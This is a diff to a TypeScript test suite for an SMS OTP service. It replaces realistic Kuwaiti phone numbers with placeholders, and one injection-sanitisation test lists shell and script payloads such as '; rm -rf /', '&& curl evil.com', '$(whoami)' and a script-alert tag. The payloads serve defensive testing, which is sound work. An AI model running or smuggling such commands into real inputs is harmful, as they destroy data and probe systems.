@@ -31,6 +31,10 @@ import { prependCountryCode } from '../src/services/sms';
 import { generateCode, storeOtp, verifyOtp, checkCooldown } from '../src/services/otp';
 import { checkSendRateLimit } from '../src/services/rate-limit';
 import { normalizePhone } from 'kwtsms';
+// 2026-11-05 10:03 +03: real-looking sample mobiles replaced, int-testnumber. OTP and prepend
+// cases only pass the number through (PLACEHOLDER); injection payloads use UNASSIGNED_CC (999 is
+// unassigned); Kuwait format cases build variants of KWTSMS_TEST_NUMBER and skip when it is unset.
+import { PLACEHOLDER, PLACEHOLDER_LOCAL, UNASSIGNED_CC, requireNumber, variants } from './helpers/test-number';
 
 function sha256(value: string): string {
   return crypto.createHash('sha256').update(value).digest('hex');
@@ -282,8 +286,8 @@ describe('Phase F: OTP Security', () => {
   });
 
   it('F-2: storeOtp hashes code and phone for doc ID', async () => {
-    await storeOtp('96598765432', '123456');
-    const phoneHash = sha256('96598765432');
+    await storeOtp(PLACEHOLDER, '123456');
+    const phoneHash = sha256(PLACEHOLDER);
     const codeHash = sha256('123456');
     const doc = await db.collection('otp_codes').doc(phoneHash).get();
     assert.ok(doc.exists);
@@ -294,14 +298,14 @@ describe('Phase F: OTP Security', () => {
   });
 
   it('F-3: verifyOtp succeeds with correct code', async () => {
-    await storeOtp('96598765432', '654321');
-    const r = await verifyOtp('96598765432', '654321');
+    await storeOtp(PLACEHOLDER, '654321');
+    const r = await verifyOtp(PLACEHOLDER, '654321');
     assert.strictEqual(r.success, true);
   });
 
   it('F-4: verifyOtp fails with wrong code', async () => {
-    await storeOtp('96598765432', '654321');
-    const r = await verifyOtp('96598765432', '000000');
+    await storeOtp(PLACEHOLDER, '654321');
+    const r = await verifyOtp(PLACEHOLDER, '000000');
     assert.strictEqual(r.success, false);
     assert.strictEqual(r.error, 'Invalid code');
   });
@@ -317,24 +321,24 @@ describe('Phase F: OTP Security', () => {
   });
 
   it('F-6: generic error for non-existent phone', async () => {
-    const r = await verifyOtp('96599999999', '123456');
+    const r = await verifyOtp(UNASSIGNED_CC, '123456');
     assert.strictEqual(r.success, false);
     assert.strictEqual(r.error, 'Code expired or not found');
   });
 
   it('F-7: cooldown blocks rapid resends', async () => {
-    await storeOtp('96598765432', '111111');
-    assert.strictEqual(await checkCooldown('96598765432'), true);
+    await storeOtp(PLACEHOLDER, '111111');
+    assert.strictEqual(await checkCooldown(PLACEHOLDER), true);
     assert.strictEqual(await checkCooldown('96500000001'), false);
   });
 
   it('F-8: new OTP overwrites old', async () => {
-    await storeOtp('96598765432', '111111');
-    await storeOtp('96598765432', '222222');
-    const r1 = await verifyOtp('96598765432', '111111');
+    await storeOtp(PLACEHOLDER, '111111');
+    await storeOtp(PLACEHOLDER, '222222');
+    const r1 = await verifyOtp(PLACEHOLDER, '111111');
     assert.strictEqual(r1.success, false);
-    await storeOtp('96598765432', '333333');
-    const r2 = await verifyOtp('96598765432', '333333');
+    await storeOtp(PLACEHOLDER, '333333');
+    const r2 = await verifyOtp(PLACEHOLDER, '333333');
     assert.strictEqual(r2.success, true);
   });
 
@@ -377,8 +381,8 @@ describe('Phase H: Rate Limiting', () => {
   });
 
   it('H-3: OTP cooldown blocks same phone', async () => {
-    await storeOtp('96598765432', '111111');
-    assert.strictEqual(await checkCooldown('96598765432'), true);
+    await storeOtp(PLACEHOLDER, '111111');
+    assert.strictEqual(await checkCooldown(PLACEHOLDER), true);
     assert.strictEqual(await checkCooldown('96500099999'), false);
   });
 });
@@ -436,9 +440,10 @@ describe('Phase I: Security', () => {
 
   it('I-7: phone number injection sanitized by normalizePhone', () => {
     const payloads = [
-      '+96598765432; rm -rf /',
-      '96598765432\n96500000000',
-      '96598765432 && curl evil.com',
+      // 2026-11-05 10:03 +03: unassigned 999 number instead of a real-looking mobile, int-testnumber
+      `+${UNASSIGNED_CC}; rm -rf /`,
+      `${UNASSIGNED_CC}\n96500000000`,
+      `${UNASSIGNED_CC} && curl evil.com`,
       '$(whoami)',
       '<script>alert(1)</script>',
     ];
@@ -498,26 +503,32 @@ describe('Phase I: Security', () => {
 // ============================================================
 
 describe('Phase J: Edge Cases', () => {
-  it('J-1: phone number format normalization', () => {
+  it('J-1: phone number format normalization', (ctx) => {
+    // 2026-11-05 10:03 +03: variants built from KWTSMS_TEST_NUMBER at runtime; the assert message
+    // names the format only, never the number, int-testnumber
+    const n = requireNumber(ctx);
+    if (!n) return;
+    const v = variants(n);
     const tests = [
-      { input: '96598765432', desc: 'full Kuwait' },
-      { input: '+96598765432', desc: 'with +' },
-      { input: '0096598765432', desc: 'with 00' },
-      { input: '98765432', desc: 'local' },
-      { input: '965 9876 5432', desc: 'spaces' },
-      { input: '965-9876-5432', desc: 'dashes' },
-      { input: '(965) 98765432', desc: 'parens' },
+      { input: v.plain, desc: 'full Kuwait' },
+      { input: v.plus, desc: 'with +' },
+      { input: v.intl00, desc: 'with 00' },
+      { input: v.local, desc: 'local' },
+      { input: v.spaced, desc: 'spaces' },
+      { input: v.dashed, desc: 'dashes' },
+      { input: v.paren, desc: 'parens' },
     ];
     for (const t of tests) {
       const norm = normalizePhone(t.input);
-      assert.ok(/^\d+$/.test(norm), `${t.desc}: "${t.input}" -> "${norm}" should be digits`);
+      assert.ok(/^\d+$/.test(norm), `${t.desc}: should normalize to digits`);
     }
   });
 
   it('J-2: country code prepend logic', () => {
     const cov = [{ prefix: '965', country: 'Kuwait' }, { prefix: '966', country: 'Saudi Arabia' }];
-    assert.strictEqual(prependCountryCode('96598765432', '965', cov), '96598765432');
-    assert.strictEqual(prependCountryCode('98765432', '965', cov), '96598765432');
+    // 2026-11-05 10:03 +03: prefix-only logic, placeholders instead of a real-looking mobile, int-testnumber
+    assert.strictEqual(prependCountryCode(PLACEHOLDER, '965', cov), PLACEHOLDER);
+    assert.strictEqual(prependCountryCode(PLACEHOLDER_LOCAL, '965', cov), PLACEHOLDER);
     assert.strictEqual(prependCountryCode('966587469874', '965', cov), '966587469874');
     assert.strictEqual(prependCountryCode('44123456789', '965', cov), '96544123456789');
   });
@@ -545,8 +556,11 @@ describe('Phase J: Edge Cases', () => {
     assert.ok(r.includes('<b>Bold</b>'), 'HTML preserved (SMS is plain text)');
   });
 
-  it('J-7: Arabic digits in phone numbers', () => {
-    const norm = normalizePhone('٩٦٥٩٨٧٦٥٤٣٢');
+  it('J-7: Arabic digits in phone numbers', (ctx) => {
+    // 2026-11-05 10:03 +03: Arabic-Indic variant built from KWTSMS_TEST_NUMBER at runtime, int-testnumber
+    const n = requireNumber(ctx);
+    if (!n) return;
+    const norm = normalizePhone(variants(n).arabic);
     assert.ok(/^\d+$/.test(norm), 'Arabic digits converted to Latin');
   });
 
